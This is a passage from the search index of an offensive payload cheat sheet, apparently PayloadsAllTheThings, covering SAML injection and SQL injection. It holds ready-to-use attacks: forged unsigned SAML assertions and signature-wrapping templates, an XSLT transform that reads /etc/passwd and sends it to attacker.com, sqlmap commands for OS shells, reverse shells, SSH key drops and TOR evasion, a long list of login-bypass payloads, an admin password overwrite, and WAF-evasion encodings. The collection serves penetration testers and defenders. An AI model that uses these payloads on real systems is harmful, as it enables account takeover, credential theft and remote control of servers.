Stripping","text":"<p>[...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn</p> <p>The goal is to forge a well formed SAML Assertion without signing it. For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed.</p> <p>Example of SAML assertion where <code>NameID=admin</code> without signature.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"http://localhost:7001/saml2/sp/acs/post\" ID=\"id39453084082248801717742013\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\"&gt;\n&lt;saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" Format=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\"&gt;REDACTED&lt;/saml2:Issuer&gt;\n&lt;saml2p:Status xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"&gt;\n&lt;saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" /&gt;\n&lt;/saml2p:Status&gt;\n&lt;saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"id3945308408248426654986295\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\"&gt;\n&lt;saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"&gt;REDACTED&lt;/saml2:Issuer&gt;\n&lt;saml2:Subject xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"&gt;\n&lt;saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified\"&gt;admin&lt;/saml2:NameID&gt;\n&lt;saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"&gt;\n&lt;saml2:SubjectConfirmationData NotOnOrAfter=\"2018-04-22T10:33:53.593Z\" Recipient=\"http://localhost:7001/saml2/sp/acs/post\" /&gt;\n&lt;/saml2:SubjectConfirmation&gt;\n&lt;/saml2:Subject&gt;\n&lt;saml2:Conditions NotBefore=\"2018-04-22T10:23:53.593Z\" NotOnOrAfter=\"2018-0422T10:33:53.593Z\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"&gt;\n&lt;saml2:AudienceRestriction&gt;\n&lt;saml2:Audience&gt;WLS_SP&lt;/saml2:Audience&gt;\n&lt;/saml2:AudienceRestriction&gt;\n&lt;/saml2:Conditions&gt;\n&lt;saml2:AuthnStatement AuthnInstant=\"2018-04-22T10:28:49.876Z\" SessionIndex=\"id1524392933593.694282512\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"&gt;\n&lt;saml2:AuthnContext&gt;\n&lt;saml2:AuthnContextClassRef&gt;urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport&lt;/saml2:AuthnContextClassRef&gt;\n&lt;/saml2:AuthnContext&gt;\n&lt;/saml2:AuthnStatement&gt;\n&lt;/saml2:Assertion&gt;\n&lt;/saml2p:Response&gt;\n</code></pre>"},{"location":"SAML%20Injection/#xml-signature-wrapping-attacks","title":"XML Signature Wrapping Attacks","text":"<p>XML Signature Wrapping (XSW) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently depending on the order of assertions.</p> <ul> <li>XSW1 \u2013 Applies to SAML Response messages. Add a cloned unsigned copy of the Response after the existing signature.</li> <li>XSW2 \u2013 Applies to SAML Response messages. Add a cloned unsigned copy of the Response before the existing signature.</li> <li>XSW3 \u2013 Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion before the existing Assertion.</li> <li>XSW4 \u2013 Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion within the existing Assertion.</li> <li>XSW5 \u2013 Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed at the end of the SAML message.</li> <li>XSW6 \u2013 Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed after the original signature.</li> <li>XSW7 \u2013 Applies to SAML Assertion messages. Add an \u201cExtensions\u201d block with a cloned unsigned assertion.</li> <li>XSW8 \u2013 Applies to SAML Assertion messages. Add an \u201cObject\u201d block containing a copy of the original assertion with the signature removed.</li> </ul> <p>In the following example, these terms are used.</p> <ul> <li>FA: Forged Assertion</li> <li>LA: Legitimate Assertion</li> <li>LAS: Signature of the Legitimate Assertion</li> </ul> <pre><code>&lt;SAMLResponse&gt;\n&lt;FA ID=\"evil\"&gt;\n&lt;Subject&gt;Attacker&lt;/Subject&gt;\n&lt;/FA&gt;\n&lt;LA ID=\"legitimate\"&gt;\n&lt;Subject&gt;Legitimate User&lt;/Subject&gt;\n&lt;LAS&gt;\n&lt;Reference Reference URI=\"legitimate\"&gt;\n&lt;/Reference&gt;\n&lt;/LAS&gt;\n&lt;/LA&gt;\n&lt;/SAMLResponse&gt;\n</code></pre> <p>In the Github Enterprise vulnerability, this request would verify and create a sessions for <code>Attacker</code> instead of <code>Legitimate User</code>, even if <code>FA</code> is not signed.</p>"},{"location":"SAML%20Injection/#xml-comment-handling","title":"XML Comment Handling","text":"<p>A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual\u2019s SSO password. This vulnerability has multiple CVE in the following libraries and products.</p> <ul> <li>OneLogin - python-saml - CVE-2017-11427</li> <li>OneLogin - ruby-saml - CVE-2017-11428</li> <li>Clever - saml2-js - CVE-2017-11429</li> <li>OmniAuth-SAML - CVE-2017-11430</li> <li>Shibboleth - CVE-2018-0489</li> <li>Duo Network Gateway - CVE-2018-7340</li> </ul> <p>Researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.</p> <p><pre><code>&lt;SAMLResponse&gt;\n&lt;Issuer&gt;https://idp.com/&lt;/Issuer&gt;\n&lt;Assertion ID=\"_id1234\"&gt;\n&lt;Subject&gt;\n&lt;NameID&gt;user@user.com&lt;!--XMLCOMMENT--&gt;.evil.com&lt;/NameID&gt;\n</code></pre> Where <code>user@user.com</code> is the first part of the username, and <code>.evil.com</code> is the second.</p>"},{"location":"SAML%20Injection/#xml-external-entity","title":"XML External Entity","text":"<p>An alternative exploitation would use <code>XML entities</code> to bypass the signature verification, since the content will not change, except during XML parsing.</p> <p>In the following example: - <code>&amp;s;</code> will resolve to the string <code>\"s\"</code> - <code>&amp;f1;</code> will resolve to the string <code>\"f1\"</code></p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE Response [\n  &lt;!ENTITY s \"s\"&gt;\n&lt;!ENTITY f1 \"f1\"&gt;\n]&gt;\n&lt;saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"\nDestination=\"https://idptestbed/Shibboleth.sso/SAML2/POST\"\nID=\"_04cfe67e596b7449d05755049ba9ec28\"\nInResponseTo=\"_dbbb85ce7ff81905a3a7b4484afb3a4b\"\nIssueInstant=\"2017-12-08T15:15:56.062Z\" Version=\"2.0\"&gt;\n[...]\n  &lt;saml2:Attribute FriendlyName=\"uid\"\nName=\"urn:oid:0.9.2342.19200300.100.1.1\"\nNameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\"&gt;\n&lt;saml2:AttributeValue&gt;\n&amp;s;taf&amp;f1;\n&lt;/saml2:AttributeValue&gt;\n&lt;/saml2:Attribute&gt;\n[...]\n&lt;/saml2p:Response&gt;\n</code></pre> <p>The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports \"taf\" as the value of the \"uid\" attribute.</p>"},{"location":"SAML%20Injection/#extensible-stylesheet-language-transformation","title":"Extensible Stylesheet Language Transformation","text":"<p>An XSLT can be carried out by using the <code>transform</code> element.</p> <p>  Picture from http://sso-attacks.org/XSLT_Attack </p> <pre><code>&lt;ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"&gt;\n...\n    &lt;ds:Transforms&gt;\n&lt;ds:Transform&gt;\n&lt;xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;\n&lt;xsl:template match=\"doc\"&gt;\n&lt;xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/&gt;\n&lt;xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/&gt;\n&lt;xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/&gt;\n&lt;xsl:variable name=\"exploitUrl\"select=\"concat($attackerUrl,$escaped)\"/&gt;\n&lt;xsl:value-of select=\"unparsed-text($exploitUrl)\"/&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n&lt;/ds:Transform&gt;\n&lt;/ds:Transforms&gt;\n...\n&lt;/ds:Signature&gt;\n</code></pre>"},{"location":"SAML%20Injection/#references","title":"References","text":"<ul> <li>SAML Burp Extension - ROLAND BISCHOFBERGER - JULY 24, 2015</li> <li>The road to your codebase is paved with forged assertions - @ilektrojohn - March 13, 2017</li> <li>SAML_Security_Cheat_Sheet.md - OWASP</li> <li>On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko Jensen</li> <li>Making Headlines: SAML - March 19, 2018 - Torsten George</li> <li>Vulnerability Note VU#475445 - 2018-02-27 - Carnegie Mellon University</li> <li>ORACLE WEBLOGIC - MULTIPLE SAML VULNERABILITIES (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - Jul 18, 2018</li> <li>Truncation of SAML Attributes in Shibboleth 2 - 2018-01-15 - redteam-pentesting.de</li> <li>Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - March 7th, 2017 - Jem Jensen</li> <li>How to Hunt Bugs in SAML; a Methodology - Part I - @epi052</li> <li>How to Hunt Bugs in SAML; a Methodology - Part II - @epi052</li> <li>How to Hunt Bugs in SAML; a Methodology - Part III - @epi052</li> </ul>"},{"location":"SQL%20Injection/","title":"SQL Injection","text":"<p>A SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application.</p> <p>Attempting to manipulate SQL queries may have goals including: - Information Leakage - Disclosure of stored data - Manipulation of stored data - Bypassing authorization controls</p>"},{"location":"SQL%20Injection/#summary","title":"Summary","text":"<ul> <li>CheatSheet MSSQL Injection</li> <li>CheatSheet MySQL Injection</li> <li>CheatSheet OracleSQL Injection</li> <li>CheatSheet PostgreSQL Injection</li> <li>CheatSheet SQLite Injection</li> <li>CheatSheet Cassandra Injection</li> <li>Entry point detection</li> <li>DBMS Identification</li> <li>SQL injection using SQLmap</li> <li>Basic arguments for SQLmap</li> <li>Load a request file and use mobile user-agent</li> <li>Custom injection in UserAgent/Header/Referer/Cookie</li> <li>Second order injection</li> <li>Shell</li> <li>Crawl a website with SQLmap and auto-exploit</li> <li>Using TOR with SQLmap</li> <li>Using a proxy with SQLmap</li> <li>Using Chrome cookie and a Proxy</li> <li>Using suffix to tamper the injection</li> <li>General tamper option and tamper's list</li> <li>SQLmap without SQL injection</li> <li>Authentication bypass</li> <li>Authentication Bypass (Raw MD5 SHA1)</li> <li>Polyglot injection</li> <li>Routed injection</li> <li>Insert Statement - ON DUPLICATE KEY UPDATE</li> <li>WAF Bypass</li> </ul>"},{"location":"SQL%20Injection/#entry-point-detection","title":"Entry point detection","text":"<p>Detection of an SQL injection entry point Simple characters</p> <pre><code>'\n%27\n\"\n%22\n#\n%23\n;\n%3B\n)\nWildcard (*)\n&amp;apos;  # required for XML content\n</code></pre> <p>Multiple encoding</p> <pre><code>%%2727\n%25%27\n</code></pre> <p>Merging characters</p> <pre><code>`+HERP\n'||'DERP\n'+'herp\n' 'DERP\n'%20'HERP\n'%2B'HERP\n</code></pre> <p>Logic Testing</p> <pre><code>page.asp?id=1 or 1=1 -- true\npage.asp?id=1' or 1=1 -- true\npage.asp?id=1\" or 1=1 -- true\npage.asp?id=1 and 1=2 -- false\n</code></pre> <p>Weird characters</p> <pre><code>Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was\ntransformed into U+0022 QUOTATION MARK (\")\nUnicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was\ntransformed into U+0027 APOSTROPHE (')\n</code></pre>"},{"location":"SQL%20Injection/#dbms-identification","title":"DBMS Identification","text":"<pre><code>[\"conv('a',16,2)=conv('a',16,2)\"                   ,\"MYSQL\"],\n[\"connection_id()=connection_id()\"                 ,\"MYSQL\"],\n[\"crc32('MySQL')=crc32('MySQL')\"                   ,\"MYSQL\"],\n[\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\"       ,\"MSSQL\"],\n[\"@@CONNECTIONS&gt;0\"                                 ,\"MSSQL\"],\n[\"@@CONNECTIONS=@@CONNECTIONS\"                     ,\"MSSQL\"],\n[\"@@CPU_BUSY=@@CPU_BUSY\"                           ,\"MSSQL\"],\n[\"USER_ID(1)=USER_ID(1)\"                           ,\"MSSQL\"],\n[\"ROWNUM=ROWNUM\"                                   ,\"ORACLE\"],\n[\"RAWTOHEX('AB')=RAWTOHEX('AB')\"                   ,\"ORACLE\"],\n[\"LNNVL(0=123)\"                                    ,\"ORACLE\"],\n[\"5::int=5\"                                        ,\"POSTGRESQL\"],\n[\"5::integer=5\"                                    ,\"POSTGRESQL\"],\n[\"pg_client_encoding()=pg_client_encoding()\"       ,\"POSTGRESQL\"],\n[\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"],\n[\"quote_literal(42.5)=quote_literal(42.5)\"         ,\"POSTGRESQL\"],\n[\"current_database()=current_database()\"           ,\"POSTGRESQL\"],\n[\"sqlite_version()=sqlite_version()\"               ,\"SQLITE\"],\n[\"last_insert_rowid()&gt;1\"                           ,\"SQLITE\"],\n[\"last_insert_rowid()=last_insert_rowid()\"         ,\"SQLITE\"],\n[\"val(cvar(1))=1\"                                  ,\"MSACCESS\"],\n[\"IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0\"               ,\"MSACCESS\"],\n[\"cdbl(1)=cdbl(1)\"                                 ,\"MSACCESS\"],\n[\"1337=1337\",   \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n[\"'i'='i'\",     \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n</code></pre>"},{"location":"SQL%20Injection/#sql-injection-using-sqlmap","title":"SQL injection using SQLmap","text":""},{"location":"SQL%20Injection/#basic-arguments-for-sqlmap","title":"Basic arguments for SQLmap","text":"<pre><code>sqlmap --url=\"&lt;url&gt;\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs\n</code></pre>"},{"location":"SQL%20Injection/#load-a-request-file-and-use-mobile-user-agent","title":"Load a request file and use mobile user-agent","text":"<pre><code>sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1\n</code></pre>"},{"location":"SQL%20Injection/#custom-injection-in-useragentheaderreferercookie","title":"Custom injection in UserAgent/Header/Referer/Cookie","text":"<pre><code>python sqlmap.py -u \"http://example.com\" --data \"username=admin&amp;password=pass\"  --headers=\"x-forwarded-for:127.0.0.1*\"\nThe injection is located at the '*'\n</code></pre>"},{"location":"SQL%20Injection/#second-order-injection","title":"Second order injection","text":"<pre><code>python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3\nsqlmap -r 1.txt -dbms MySQL -second-order \"http://&lt;IP/domain&gt;/joomla/administrator/index.php\" -D \"joomla\" -dbs\n</code></pre>"},{"location":"SQL%20Injection/#shell","title":"Shell","text":"<pre><code>SQL Shell\npython sqlmap.py -u \"http://example.com/?id=1\"  -p id --sql-shell\nSimple Shell\npython sqlmap.py -u \"http://example.com/?id=1\"  -p id --os-shell\nDropping a reverse-shell / meterpreter\npython sqlmap.py -u \"http://example.com/?id=1\"  -p id --os-pwn\nSSH Shell by dropping an SSH key\npython sqlmap.py -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/\n</code></pre>"},{"location":"SQL%20Injection/#crawl-a-website-with-sqlmap-and-auto-exploit","title":"Crawl a website with SQLmap and auto-exploit","text":"<pre><code>sqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3\n--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers\n--crawl = how deep you want to crawl a site\n--forms = Parse and test forms\n</code></pre>"},{"location":"SQL%20Injection/#using-tor-with-sqlmap","title":"Using TOR with SQLmap","text":"<pre><code>sqlmap -u \"http://www.target.com\" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5\n</code></pre>"},{"location":"SQL%20Injection/#using-a-proxy-with-sqlmap","title":"Using a proxy with SQLmap","text":"<pre><code>sqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"\n</code></pre>"},{"location":"SQL%20Injection/#using-chrome-cookie-and-a-proxy","title":"Using Chrome cookie and a Proxy","text":"<pre><code>sqlmap -u \"https://test.com/index.php?id=99\" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy \"http://127.0.0.1:8080\"  -f  --time-sec 15 --level 3\n</code></pre>"},{"location":"SQL%20Injection/#using-suffix-to-tamper-the-injection","title":"Using suffix to tamper the injection","text":"<pre><code>python sqlmap.py -u \"http://example.com/?id=1\"  -p id --suffix=\"-- \"\n</code></pre>"},{"location":"SQL%20Injection/#general-tamper-option-and-tampers-list","title":"General tamper option and tamper's list","text":"<pre><code>tamper=name_of_the_tamper\n</code></pre> Tamper Description 0x2char.py Replaces each (MySQL) 0x encoded string with equivalent CONCAT(CHAR(),\u2026) counterpart apostrophemask.py Replaces apostrophe character with its UTF-8 full width counterpart apostrophenullencode.py Replaces apostrophe character with its illegal double unicode counterpart appendnullbyte.py Appends encoded NULL byte character at the end of payload base64encode.py Base64 all characters in a given payload between.py Replaces greater than operator ('&gt;') with 'NOT BETWEEN 0 AND #' bluecoat.py Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator chardoubleencode.py Double url-encodes all characters in a given payload (not processing already encoded) charencode.py URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54) charunicodeencode.py Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054) charunicodeescape.py Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) commalesslimit.py Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' commalessmid.py Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' commentbeforeparentheses.py Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/() concat2concatws.py Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' charencode.py Url-encodes all characters in a given payload (not processing already encoded) charunicodeencode.py Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) equaltolike.py Replaces all occurrences of operator equal ('=') with operator 'LIKE' escapequotes.py Slash escape quotes (' and \") greatest.py Replaces greater than operator ('&gt;') with 'GREATEST' counterpart halfversionedmorekeywords.py Adds versioned MySQL comment before each keyword htmlencode.py HTML encode (using code points) all non-alphanumeric characters (e.g. \u2018 -&gt; ') ifnull2casewhenisnull.py Replaces instances like \u2018IFNULL(A, B)\u2019 with \u2018CASE WHEN ISNULL(A) THEN (B) ELSE (A) END\u2019 counterpart ifnull2ifisnull.py Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' informationschemacomment.py Add an inline comment (/**/) to the end of all occurrences of (MySQL) \u201cinformation_schema\u201d identifier least.py Replaces greater than operator (\u2018&gt;\u2019) with \u2018LEAST\u2019 counterpart lowercase.py Replaces each keyword character with lower case value (e.g. SELECT -&gt; select) modsecurityversioned.py Embraces complete query with versioned comment modsecurityzeroversioned.py Embraces complete query with zero-versioned comment multiplespaces.py Adds multiple spaces around SQL keywords nonrecursivereplacement.py Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters overlongutf8.py Converts all characters in a given payload (not processing already encoded) overlongutf8more.py Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) percentage.py Adds a percentage sign ('%') infront of each character plus2concat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) function CONCAT() counterpart plus2fnconcat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) ODBC function {fn CONCAT()} counterpart randomcase.py Replaces each keyword character with random case value randomcomments.py Add random comments to SQL keywords securesphere.py Appends special crafted string sp_password.py Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs space2comment.py Replaces space character (' ') with comments space2dash.py Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') space2hash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2morehash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2mssqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mssqlhash.py Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') space2mysqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mysqldash.py Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') space2plus.py Replaces space character (' ') with plus ('+') space2randomblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters symboliclogical.py Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT unmagicquotes.py Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) uppercase.py Replaces each keyword character with upper case value 'INSERT' varnish.py Append a HTTP header 'X-originating-IP' versionedkeywords.py Encloses each non-function keyword with versioned MySQL comment versionedmorekeywords.py Encloses each keyword with versioned MySQL comment xforwardedfor.py Append a fake HTTP header 'X-Forwarded-For'"},{"location":"SQL%20Injection/#sqlmap-without-sql-injection","title":"SQLmap without SQL injection","text":"<p>You can use SQLmap to access a database via its port instead of a URL.</p> <pre><code>sqlmap.py -d \"mysql://user:pass@ip/database\" --dump-all \n</code></pre>"},{"location":"SQL%20Injection/#authentication-bypass","title":"Authentication bypass","text":"<pre><code>'-'\n' '\n'&amp;'\n'^'\n'*'\n' or 1=1 limit 1 -- -+\n'=\"or'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n'-||0'\n\"-||0\"\n\"-\"\n\" \"\n\"&amp;\"\n\"^\"\n\"*\"\n'--'\n\"--\"\n'--' / \"--\"\n\" or \"\"-\"\n\" or \"\" \"\n\" or \"\"&amp;\"\n\" or \"\"^\"\n\" or \"\"*\"\nor true--\n\" or true--\n' or true--\n\") or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n\" or \"x\"=\"x\n\") or (\"x\")=(\"x\n\")) or ((\"x\"))=((\"x\nor 2 like 2\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' -- -\nadmin' #\nadmin'/*\nadmin' or '2' LIKE '1\nadmin' or 2 LIKE 2--\nadmin' or 2 LIKE 2#\nadmin') or 2 LIKE 2#\nadmin') or 2 LIKE 2--\nadmin') or ('2' LIKE '2\nadmin') or ('2' LIKE '2'#\nadmin') or ('2' LIKE '2'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin\" --\nadmin';-- azer \nadmin\" #\nadmin\"/*\nadmin\" or \"1\"=\"1\nadmin\" or \"1\"=\"1\"--\nadmin\" or \"1\"=\"1\"#\nadmin\" or \"1\"=\"1\"/*\nadmin\"or 1=1 or \"\"=\"\nadmin\" or 1=1\nadmin\" or 1=1--\nadmin\" or 1=1#\nadmin\" or 1=1/*\nadmin\") or (\"1\"=\"1\nadmin\") or (\"1\"=\"1\"--\nadmin\") or (\"1\"=\"1\"#\nadmin\") or (\"1\"=\"1\"/*\nadmin\") or \"1\"=\"1\nadmin\") or \"1\"=\"1\"--\nadmin\") or \"1\"=\"1\"#\nadmin\") or \"1\"=\"1\"/*\n1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\n</code></pre>"},{"location":"SQL%20Injection/#authentication-bypass-raw-md5-sha1","title":"Authentication Bypass (Raw MD5 SHA1)","text":"<p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p> <pre><code>\"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\"\n</code></pre> <p>Allowing an attacker to craft a string with a <code>true</code> statement such as <code>' or 'SOMETHING</code></p> <pre><code>md5(\"ffifdyop\", true) = 'or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c\nsha1(\"3fDf \", true) = Q\ufffdu'='\ufffd@\ufffd[\ufffdt\ufffd- o\ufffd\ufffd_-!\n</code></pre> <p>Challenge demo available at http://web.jarvisoj.com:32772</p>"},{"location":"SQL%20Injection/#polyglot-injection-multicontext","title":"Polyglot injection (multicontext)","text":"<pre><code>SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/\n/* MySQL only */\nIF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/\n</code></pre>"},{"location":"SQL%20Injection/#routed-injection","title":"Routed injection","text":"<pre><code>admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'\n</code></pre>"},{"location":"SQL%20Injection/#insert-statement-on-duplicate-key-update","title":"Insert Statement - ON DUPLICATE KEY UPDATE","text":"<p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p> <pre><code>Inject using payload:\nattacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" --\nThe query would look like this:\nINSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" -- \", \"bcrypt_hash_of_your_password_input\");\nThis query will insert a row for the user \u201cattacker_dummy@example.com\u201d. It will also insert a row for the user \u201cadmin@example.com\u201d.\nBecause this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to \"bcrypt_hash_of_qwerty\".\nAfter this, we can simply authenticate with \u201cadmin@example.com\u201d and the password \u201cqwerty\u201d!\n</code></pre>"},{"location":"SQL%20Injection/#waf-bypass","title":"WAF Bypass","text":""},{"location":"SQL%20Injection/#white-spaces-alternatives","title":"White spaces alternatives","text":"<p>No Space (%20) - bypass using whitespace alternatives</p> <pre><code>?id=1%09and%091=1%09--\n?id=1%0Dand%0D1=1%0D--\n?id=1%0Cand%0C1=1%0C--\n?id=1%0Band%0B1=1%0B--\n?id=1%0Aand%0A1=1%0A--\n?id=1%A0and%A01=1%A0--\n</code></pre> <p>No Whitespace - bypass using comments</p> <pre><code>?id=1/*comment*/and/**/1=1/**/--\n</code></pre> <p>No Whitespace - bypass using parenthesis</p> <pre><code>?id=(1)and(1)=(1)--\n</code></pre> <p>Whitespace alternatives by DBMS | DBMS | ASCII characters in hexadicimal | | ---- | ------------------------------- | | SQLite3 | 0A, 0D, 0C, 09, 20 | | MySQL 5 | 09, 0A, 0B, 0C, 0D, A0, 20 | | MySQL 3   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 | | PostgreSQL | 0A, 0D, 0C, 09, 20 | | Oracle 11g | 00, 0A, 0D, 0C, 09, 20 | | MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |</p> <p>Example of query where spaces were replaced by ascii characters above 0x80 <pre><code>\u2640SELECT\u00a7*\u2302FROM\u263ausers\u266bWHERE\u26421\u263c=\u00b61\u203c\n</code></pre></p>"},{"location":"SQL%20Injection/#no-comma","title":"No Comma","text":"<p>Bypass using OFFSET, FROM and JOIN</p> <pre><code>LIMIT 0,1         -&gt; LIMIT 1 OFFSET 